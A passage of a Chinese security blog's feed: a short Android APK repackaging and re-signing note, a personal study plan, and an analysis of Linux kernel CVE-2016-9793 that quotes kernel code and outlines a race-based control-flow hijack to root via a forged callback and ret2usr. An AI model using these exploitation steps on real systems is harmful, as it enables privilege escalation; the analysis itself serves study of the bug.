    <title>记一次对某APP的安卓逆向过程</title>
    <link href="http://phot0n.com/2023/08/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90APP%E7%9A%84%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91%E8%BF%87%E7%A8%8B/"/>
    <id>http://phot0n.com/2023/08/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90APP%E7%9A%84%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91%E8%BF%87%E7%A8%8B/</id>
    <published>2023-08-11T07:54:20.000Z</published>
    <updated>2023-08-11T12:23:39.871Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">objection patchapk -s target_app.apk</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apktool b -o test_copy.apk copymanga</span><br></pre></td></tr></table></figure><p>签名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jarsigner -verbose -keystore demo.keystore test_copy.apk demo.keystore</span><br></pre></td></tr></table></figure><h1 id="找签名校验"><a href="#找签名校验" class="headerlink" title="找签名校验"></a>找签名校验</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>2023夏季之后计划表与忏悔录</title>
    <link href="http://phot0n.com/2023/08/10/2023%E8%AE%A1%E5%88%92%E8%A1%A8/"/>
    <id>http://phot0n.com/2023/08/10/2023%E8%AE%A1%E5%88%92%E8%A1%A8/</id>
    <published>2023-08-10T08:14:28.000Z</published>
    <updated>2023-08-11T07:47:03.279Z</updated>
    
    <content type="html"><![CDATA[<p>感觉自己这一个学期以来都太颓废了，很多想学的，想看的东西都鸽了，变成了无休止的睡眠。</p><p>自己不知道为何莫名其妙嗜睡(进大学以来好像就变成这样了)，也许是看室友没起床自己也不想起床（然后室友看我没起床也不像起床x）</p><p>最近忙完了夏令营，收获了保底offer，预推免再想办法冲一下吧（其实感觉不冲也无所谓了，我已经摆烂了）</p><p>感觉自己太菜了，本身起步就晚挺多的，还容易摆烂，每天学习时间感觉非常少，有效学习时间就更少了。所以想把自己想学的东西mark一下，每天有学的话就实时更新进展。同时为了克服自己爱睡懒觉的毛病(喜欢熬夜看漫画，然后一觉醒来就GG。从大一一直颓废到现在)，如果自己在8：30之后起床就在这里忏悔（有用吗？如有x），如果按时起床就也mark一下，鼓励自己</p><h3 id="主要计划"><a href="#主要计划" class="headerlink" title="主要计划"></a>主要计划</h3><ul><li>hybrid fuzz(研究生阶段想搞漏挖以及漏洞利用的活，但是现在在组里感觉也没啥产出，也没有方向更是不知道如何去干，一步步来吧)</li><li>逆向学习(主要是C++逆向吧)</li><li>跟着ucore和《操作系统真像还原》写一下OS，锻炼自己正向开发能力</li><li>C++ 开发与安卓开发，写个小项目，锻炼自己正向开发能力(目前想法是写一个漫画阅读器。寒假的时候把某漫画app的API逆出了但是只能达到离线下载的 程度。当时想patch一下该漫画的安卓端app结果好像发现有一些校验之类的，也没找到patch的地方x。而且这玩意的广告挺逆天的。既然API已经有了那自己写一个阅读器然后获取资源查看就行了)</li></ul><h3 id="忏悔录"><a href="#忏悔录" class="headerlink" title="忏悔录"></a>忏悔录</h3><ul><li>8月11日第一天，忏悔。昨晚逆一个APP到凌晨四点，有点上头了。感觉已经把逻辑理得差不多了，有碎片性的突破，但是还没有完全搞出来。对着jadx嗯静态分析感觉又蠢又费精力，今天试试学一下frida用一下。今天再没搞出来就放弃了，得花时间学hybrid fuzz的东西了。</li></ul><h3 id="进展"><a href="#进展" class="headerlink" title="进展"></a>进展</h3><ul><li></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;感觉自己这一个学期以来都太颓废了，很多想学的，想看的东西都鸽了，变成了无休止的睡眠。&lt;/p&gt;
&lt;p&gt;自己不知道为何莫名其妙嗜睡(进大学以来好像就变成这样了)，也许是看室友没起床自己也不想起床（然后室友看我没起床也不像起床x）&lt;/p&gt;
&lt;p&gt;最近忙完了夏令营，收获了保底off</summary>
      
    
    
    
    
    <category term="plan" scheme="http://phot0n.com/tags/plan/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2016-9793分析</title>
    <link href="http://phot0n.com/2023/04/19/CVE-2016-9793%E5%88%86%E6%9E%90/"/>
    <id>http://phot0n.com/2023/04/19/CVE-2016-9793%E5%88%86%E6%9E%90/</id>
    <published>2023-04-19T08:27:13.000Z</published>
    <updated>2023-08-08T16:48:35.820Z</updated>
    
    <content type="html"><![CDATA[<p>读一篇关于iot固件外设移植的paper时看到了有关该漏洞的描述，于是简要地看了一下，再此做一下记录</p><h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>在<code>net/core/sock.c</code>中，函数<code>sock_setsockopt</code>使用了错误的类型进行赋值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sock_setsockopt</span><span class="params">(struct socket *sock, <span class="keyword">int</span> level, <span class="keyword">int</span> optname,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">char</span> __user *optval, <span class="keyword">unsigned</span> <span class="keyword">int</span> optlen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> = <span class="title">sock</span>-&gt;<span class="title">sk</span>;</span></span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    ...</span><br><span class="line"><span class="keyword">if</span> (get_user(val, (<span class="keyword">int</span> __user *)optval))</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line">    ....</span><br><span class="line">    <span class="keyword">switch</span> (optname) &#123;</span><br><span class="line">    ....</span><br><span class="line"><span class="keyword">case</span> SO_SNDBUF:</span><br><span class="line"><span class="comment">/* Don&#x27;t error on this BSD doesn&#x27;t and if you think</span></span><br><span class="line"><span class="comment"> * about it this is right. Otherwise apps have to</span></span><br><span class="line"><span class="comment"> * play &#x27;guess the biggest size&#x27; games. RCVBUF/SNDBUF</span></span><br><span class="line"><span class="comment"> * are treated in BSD as hints</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">val = <span class="keyword">min_t</span>(u32, val, sysctl_wmem_max);</span><br><span class="line">set_sndbuf:</span><br><span class="line">sk-&gt;sk_userlocks |= SOCK_SNDBUF_LOCK;</span><br><span class="line">sk-&gt;sk_sndbuf = <span class="keyword">max_t</span>(u32, val * <span class="number">2</span>, SOCK_MIN_SNDBUF);</span><br><span class="line"><span class="comment">/* Wake up sending tasks if we upped the value. */</span></span><br><span class="line">sk-&gt;sk_write_space(sk);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> SO_SNDBUFFORCE:</span><br><span class="line"><span class="keyword">if</span> (!capable(CAP_NET_ADMIN)) &#123;</span><br><span class="line">ret = -EPERM;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">goto</span> set_sndbuf;</span><br><span class="line">    ....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>max_t</code>宏定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> max_t(type, x, y) (&#123;\</span></span><br><span class="line">type __max1 = (x);\</span><br><span class="line">type __max2 = (y);\</span><br><span class="line">__max1 &gt; __max2 ? __max1: __max2; &#125;)</span><br></pre></td></tr></table></figure><p>而<code>sk-&gt;sk_sndbuf</code>却是<code>int</code>类型。造成了<code>max_t(u32,-1,SOCK_MIN_RCVBUF)</code>返回的是-1，然后错误地赋给了<code>sk-&gt;sk_sndbuf</code> 。需要注意的是，这里需要走<code>SO_SNDBUFFORCE</code>这个分支，如果走<code>SO_SNDBUF</code>分支的话<code>val</code>会被赋值，可能不会取传来的值。</p><h2 id="调用链与劫持思路"><a href="#调用链与劫持思路" class="headerlink" title="调用链与劫持思路"></a>调用链与劫持思路</h2><h3 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h3><p>write系统调用对socket进行写的时候会走如下调用链</p><p>Sys_write -&gt; vfs_write() -&gt; __vfs_write() -&gt; sock_write_iter() -&gt; sock_sendmsg() -&gt; unix_stream_sendmsg() -&gt; sock_alloc_send_pskb() -&gt; alloc_skb_with_frags() -&gt; alloc_skb() -&gt; __alloc_skb()</p><p>其细节如下,首先是<code>unix_stream_sendmsg</code>时，其中有个循环，会将<code>size</code>赋值为<code>(sk-&gt;sk_sndbuf &gt;&gt; 1) - 64</code>(因为size必定大于0，而后者可控，可以赋小于零，后一个<code>min_t</code>同理)最终会把<code>sk-&gt;sk_sndbuf</code>相关值赋给<code>data_len</code> ,然后调用<code>sock_alloc_send_skb</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">unix_stream_sendmsg</span><span class="params">(struct socket *sock, struct msghdr *msg,</span></span></span><br><span class="line"><span class="function"><span class="params">       <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> = <span class="title">sock</span>-&gt;<span class="title">sk</span>;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="keyword">while</span> (sent &lt; len) &#123;</span><br><span class="line">size = len - sent;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Keep two messages in the pipe so it schedules better */</span></span><br><span class="line">size = <span class="keyword">min_t</span>(<span class="keyword">int</span>, size, (sk-&gt;sk_sndbuf &gt;&gt; <span class="number">1</span>) - <span class="number">64</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* allow fallback to order-0 allocations */</span></span><br><span class="line">size = <span class="keyword">min_t</span>(<span class="keyword">int</span>, size, SKB_MAX_HEAD(<span class="number">0</span>) + UNIX_SKB_FRAGS_SZ);</span><br><span class="line"></span><br><span class="line">data_len = <span class="keyword">max_t</span>(<span class="keyword">int</span>, <span class="number">0</span>, size - SKB_MAX_HEAD(<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">data_len = <span class="keyword">min_t</span>(<span class="keyword">size_t</span>, size, PAGE_ALIGN(data_len));</span><br><span class="line"></span><br><span class="line">skb = sock_alloc_send_pskb(sk, size - data_len, data_len,</span><br><span class="line">   msg-&gt;msg_flags &amp; MSG_DONTWAIT, &amp;err,</span><br><span class="line">   get_order(UNIX_SKB_FRAGS_SZ));</span><br><span class="line">        ...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>而在<code>sock_alloc_send_pskb</code>中,对参数<code>header_len</code>以及<code>data_len</code>（分别对应上层调用时传进的<code>size - data_len</code>以及<code>data_len</code>没有作修改，调用了<code>alloc_skb_with_frags</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct sk_buff *<span class="title">sock_alloc_send_pskb</span><span class="params">(struct sock *sk, <span class="keyword">unsigned</span> <span class="keyword">long</span> header_len,</span></span></span><br><span class="line"><span class="function"><span class="params">     <span class="keyword">unsigned</span> <span class="keyword">long</span> data_len, <span class="keyword">int</span> noblock,</span></span></span><br><span class="line"><span class="function"><span class="params">     <span class="keyword">int</span> *errcode, <span class="keyword">int</span> max_page_order)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">skb</span>;</span></span><br><span class="line"><span class="keyword">long</span> timeo;</span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">timeo = sock_sndtimeo(sk, noblock);</span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">err = sock_error(sk);</span><br><span class="line"><span class="keyword">if</span> (err != <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> failure;</span><br><span class="line"></span><br><span class="line">err = -EPIPE;</span><br><span class="line"><span class="keyword">if</span> (sk-&gt;sk_shutdown &amp; SEND_SHUTDOWN)</span><br><span class="line"><span class="keyword">goto</span> failure;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (sk_wmem_alloc_get(sk) &lt; sk-&gt;sk_sndbuf)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">set_bit(SOCK_ASYNC_NOSPACE, &amp;sk-&gt;sk_socket-&gt;flags);</span><br><span class="line">set_bit(SOCK_NOSPACE, &amp;sk-&gt;sk_socket-&gt;flags);</span><br><span class="line">err = -EAGAIN;</span><br><span class="line"><span class="keyword">if</span> (!timeo)</span><br><span class="line"><span class="keyword">goto</span> failure;</span><br><span class="line"><span class="keyword">if</span> (signal_pending(current))</span><br><span class="line"><span class="keyword">goto</span> interrupted;</span><br><span class="line">timeo = sock_wait_for_wmem(sk, timeo);</span><br><span class="line">&#125;</span><br><span class="line">skb = alloc_skb_with_frags(header_len, data_len, max_page_order,</span><br><span class="line">   errcode, sk-&gt;sk_allocation);</span><br><span class="line"><span class="keyword">if</span> (skb)</span><br><span class="line">skb_set_owner_w(skb, sk);</span><br><span class="line"><span class="keyword">return</span> skb;</span><br><span class="line"></span><br><span class="line">interrupted:</span><br><span class="line">err = sock_intr_errno(timeo);</span><br><span class="line">failure:</span><br><span class="line">*errcode = err;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而在<code>alloc_skb_with_frags</code>函数中，会调用<code>alloc_skb</code>进行<code>sk_buff</code>结构体的分配</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct sk_buff *<span class="title">alloc_skb_with_frags</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> header_len,</span></span></span><br><span class="line"><span class="function"><span class="params">     <span class="keyword">unsigned</span> <span class="keyword">long</span> data_len,</span></span></span><br><span class="line"><span class="function"><span class="params">     <span class="keyword">int</span> max_page_order,</span></span></span><br><span class="line"><span class="function"><span class="params">     <span class="keyword">int</span> *errcode,</span></span></span><br><span class="line"><span class="function"><span class="params">     <span class="keyword">gfp_t</span> gfp_mask)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">skb</span>;</span></span><br><span class="line">...</span><br><span class="line">skb = alloc_skb(header_len, gfp_head);</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>alloc_skb</code>函数实际上是<code>__alloc_skb</code>的一个简单封装</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *__<span class="title">alloc_skb</span>(<span class="title">unsigned</span> <span class="title">int</span> <span class="title">size</span>, <span class="title">gfp_t</span> <span class="title">priority</span>, <span class="title">int</span> <span class="title">flags</span>,</span></span><br><span class="line"><span class="class">    <span class="title">int</span> <span class="title">node</span>);</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct sk_buff *<span class="title">alloc_skb</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> size,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">gfp_t</span> priority)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> __alloc_skb(size, priority, <span class="number">0</span>, NUMA_NO_NODE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终会调用<code>__alloc_skb</code>，分配一个<code>sk_buff</code>结构体，并且对其一些成员(比如<code>head</code>,<code>data</code>,<code>end</code>等)进行初始化。与我们传入的<code>sk_sndbuf</code>有关的就是进行对齐，然后加上<code>skb-&gt;tail</code>,赋值给<code>skb-&gt;end</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *__<span class="title">alloc_skb</span>(<span class="title">unsigned</span> <span class="title">int</span> <span class="title">size</span>, <span class="title">gfp_t</span> <span class="title">gfp_mask</span>,</span></span><br><span class="line"><span class="class">    <span class="title">int</span> <span class="title">flags</span>, <span class="title">int</span> <span class="title">node</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">cache</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">skb_shared_info</span> *<span class="title">shinfo</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">skb</span>;</span></span><br><span class="line">u8 *data;</span><br><span class="line"><span class="keyword">bool</span> pfmemalloc;</span><br><span class="line">....</span><br><span class="line"><span class="comment">/* Get the HEAD */</span></span><br><span class="line">skb = kmem_cache_alloc_node(cache, gfp_mask &amp; ~__GFP_DMA, node);</span><br><span class="line"><span class="keyword">if</span> (!skb)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">....</span><br><span class="line">size = SKB_DATA_ALIGN(size);</span><br><span class="line">size += SKB_DATA_ALIGN(<span class="keyword">sizeof</span>(struct skb_shared_info));</span><br><span class="line">    ....</span><br><span class="line"><span class="built_in">memset</span>(skb, <span class="number">0</span>, offsetof(struct sk_buff, tail));</span><br><span class="line"><span class="comment">/* Account for allocated memory : skb + skb-&gt;head */</span></span><br><span class="line">skb-&gt;truesize = SKB_TRUESIZE(size);</span><br><span class="line">skb-&gt;pfmemalloc = pfmemalloc;</span><br><span class="line">atomic_set(&amp;skb-&gt;users, <span class="number">1</span>);</span><br><span class="line">skb-&gt;head = data;</span><br><span class="line">skb-&gt;data = data;</span><br><span class="line">skb_reset_tail_pointer(skb);</span><br><span class="line">skb-&gt;end = skb-&gt;tail + size;</span><br><span class="line">skb-&gt;mac_header = (typeof(skb-&gt;mac_header))~<span class="number">0U</span>;</span><br><span class="line">skb-&gt;transport_header = (typeof(skb-&gt;transport_header))~<span class="number">0U</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* make sure we initialize shinfo sequentially */</span></span><br><span class="line">shinfo = skb_shinfo(skb);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="劫持思路"><a href="#劫持思路" class="headerlink" title="劫持思路"></a>劫持思路</h3><p>劫持主要用的是<code>close</code>,通过控制函数指针的方式进行控制流劫持。</p><p>close会调用<code>skb_release_data</code>函数把分配的<code>sk_buff</code>的有关内存进行释放(在高版本linux中该回调已被去除)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">skb_release_data</span><span class="params">(struct sk_buff *skb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">skb_shared_info</span> *<span class="title">shinfo</span> = <span class="title">skb_shinfo</span>(<span class="title">skb</span>);</span></span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (skb-&gt;cloned &amp;&amp;</span><br><span class="line">    atomic_sub_return(skb-&gt;nohdr ? (<span class="number">1</span> &lt;&lt; SKB_DATAREF_SHIFT) + <span class="number">1</span> : <span class="number">1</span>,</span><br><span class="line">      &amp;shinfo-&gt;dataref))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; shinfo-&gt;nr_frags; i++)</span><br><span class="line">__skb_frag_unref(&amp;shinfo-&gt;frags[i]);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If skb buf is from userspace, we need to notify the caller</span></span><br><span class="line"><span class="comment"> * the lower device DMA has done;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (shinfo-&gt;tx_flags &amp; SKBTX_DEV_ZEROCOPY) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ubuf_info</span> *<span class="title">uarg</span>;</span></span><br><span class="line"></span><br><span class="line">uarg = shinfo-&gt;destructor_arg;</span><br><span class="line"><span class="keyword">if</span> (uarg-&gt;callback)</span><br><span class="line">uarg-&gt;callback(uarg, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (shinfo-&gt;frag_list)</span><br><span class="line">kfree_skb_list(shinfo-&gt;frag_list);</span><br><span class="line"></span><br><span class="line">skb_free_head(skb);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中会调用<code>shinfo-&gt;destructor_arg-&gt;callback(uarg, true)</code>进行回调函数的使用</p><p>而<code>shinfo</code>是通过<code>skb_shinfo(skb)</code>得来的，将其宏展开，事实上就是获得<code>skb-&gt;head+skb-&gt;end</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> skb_shinfo(SKB)((struct skb_shared_info *)(skb_end_pointer(SKB)))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> NET_SKBUFF_DATA_USES_OFFSET</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *<span class="title">skb_end_pointer</span><span class="params">(<span class="keyword">const</span> struct sk_buff *skb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> skb-&gt;head + skb-&gt;end;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而这些我们都是可控的。</p><p>所以我们可以通过控制<code>shinfo</code>进而指向我们布置的<code>skb_shared_info</code>结构体，构造其上的<code>destructor_arg</code>成员，指向布置好<code>callback</code>函数指针的<code>ubuf_info</code>结构体即可。</p><p>总得来说过程如下</p><ul><li>申请地址<code>0xfffffed0</code></li><li>创建线程，重复对<code>0xfffffed0</code>的<code>skb_shared_info</code>结构体进行赋值，布置好<code>callback</code>指针</li><li>建立套接字，进行发送和接收消息</li><li>调用<code>setsockopt</code>，设置<code>sk_sndbuf</code>为<code>0xfffffe00</code>(即<code>0xffffff00&lt;&lt;1</code>)</li><li>调用<code>write</code>，从而将<code>skb-&gt;end</code>设置为<code>0xfffffec0</code>，<code>skb-&gt;head</code>设置为<code>0x10</code>,得到<code>shinfo=0xfffffed0</code></li><li>通过<code>close</code>调用<code>callback</code>劫持控制流进行提权。没有开<code>kalsr</code>和<code>SMAP/SMEP</code>的情况下直接通过<code>/proc/kallsyms</code>找<code>commit_creds</code>和<code>prepare_kernel_cred</code>然后<code>ret2usr</code>即可。</li></ul><p>这里创建线程重复对<code>0xfffffed0</code>的<code>skb_shared_info</code>结构体进行赋值的原因是在进入<code>write</code>调用链时，在<code>__alloc_skb</code>中会对我们的结构体前半段进行清零(<code>skb_shared_info-&gt;destructor_arg</code>不受影响)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="built_in">memset</span>(shinfo, <span class="number">0</span>, offsetof(struct skb_shared_info, dataref));</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h1 id="漏洞利用与调试"><a href="#漏洞利用与调试" class="headerlink" title="漏洞利用与调试"></a>漏洞利用与调试</h1><p>由于没有搞源码级调试，所以就简单得加载符号然后在关键函数上面下断点</p><p>事实上调试的时候发现似乎<code>skb_release_data</code>这个函数并不是<code>close</code>调用的，我把close注释掉也能触发这个函数。而且根据gdb这个断点也不是主函数线程触发的，而是write线程。测试发现必须有<code>setsockopt(sockets[1], SOL_SOCKET, SO_SNDBUF,&amp;sndbuf, sizeof(sndbuf));</code>。gdb的BACKTRACE还炸掉了，看不到之前的一些调用链。猜测应该是使用真正的调用链应该是<code>setsockopt</code>唤醒了一个阻塞的write，然后write调用<code>kfree_skb-&gt;skb_release_all-&gt;skb_release_data</code>这样。</p><p>总的来说就三个线程:线程1(主线程)、线程2(不断地写<code>skb_shared_info-&gt;tx_flags</code>)、线程3(调用write)</p><p>有个条件竞争，我们希望在线程3调用<code>__alloc_skb</code>把<code>skb_shared_info-&gt;tx_flags</code>清零之后，线程2再把<code>skb_shared_info-&gt;tx_flags</code>写上。然后线程1调用<code>setsockopt</code>，线程3调用<code>skb_release_data</code></p><p>在这里断下来可以看到与<code>tx_flags</code>的比较操作，后面的<code>test rdi rdi</code>则是判断指针是否非空，如果非空则直接调用。这里截的是线程竞争不正确的例子(因为tx_flag没有置上)</p><p><img src="https://s2.loli.net/2023/08/09/pcRC4EsaznOqY8F.png" 